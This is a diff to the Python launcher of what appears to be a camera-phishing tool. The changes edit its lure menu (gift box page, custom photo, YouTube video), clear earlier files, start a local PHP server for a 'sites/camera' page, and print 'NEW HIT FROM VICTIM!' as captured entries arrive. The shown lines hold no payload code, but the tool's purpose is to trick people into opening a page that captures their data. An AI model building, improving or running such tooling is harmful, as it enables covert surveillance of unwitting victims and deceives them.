@@ -26,13 +26,16 @@ def start():
 
     print("\n\033[1;33m[!] Choose Link Type:\033[0m")
     print("[01] Direct Link (Gift Box Page)")
-    print("[02] Custom Photo Link (Show Image)")
-    print("[03] YouTube Video Link (Play Video)")
+    print("[02] Custom Photo Link (Enter Photo Path)")
+    print("[03] YouTube Video Link (Enter Video URL)")
     link_type = input("\n\033[1;36m[+] Select: \033[0m")
 
-    # FIX: Check input for link type
+    # Clear previous files
+    if os.path.exists("sites/camera/custom.jpg"): os.remove("sites/camera/custom.jpg")
+    if os.path.exists("sites/camera/yt_link.txt"): os.remove("sites/camera/yt_link.txt")
+
     if link_type == '2':
-        img_path = input("\n\033[1;32m[+] Enter Photo Path (e.g. /sdcard/image.jpg): \033[0m")
+        img_path = input("\n\033[1;32m[+] Enter Photo Path (e.g. /sdcard/pic.jpg): \033[0m")
         if os.path.exists(img_path):
             shutil.copy(img_path, "sites/camera/custom.jpg")
             with open("sites/camera/type.txt", "w") as f: f.write("custom")
@@ -54,7 +57,7 @@ def start():
     with open("sites/camera/mode.txt", "w") as f: f.write(mode)
     if os.path.exists("sites/camera/logs.txt"): os.remove("sites/camera/logs.txt")
 
-    print(f"\n\033[1;32m[*] Server active on Port 8080 | Mode: {mode.upper()}\033[0m")
+    print(f"\n\033[1;32m[*] PHP Server Starting on Port 8080...\033[0m")
     subprocess.Popen("php -S 127.0.0.1:8080 -t sites/camera/", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
     print("\033[1;33m[!] Waiting for Victim... (Ctrl+C to stop)\n\033[0m")
@@ -67,7 +70,7 @@ def start():
                 lines = f.readlines()
                 if len(lines) > last_line:
                     for i in range(last_line, len(lines)):
-                        print(f"\033[1;32m[+] NEW SUCCESSFUL HIT!\033[0m")
+                        print(f"\033[1;32m[+] NEW HIT FROM VICTIM!\033[0m")
                         print(f"\033[1;37m{lines[i].strip()}\033[0m")
                         print("-" * 65)
                     last_line = len(lines)
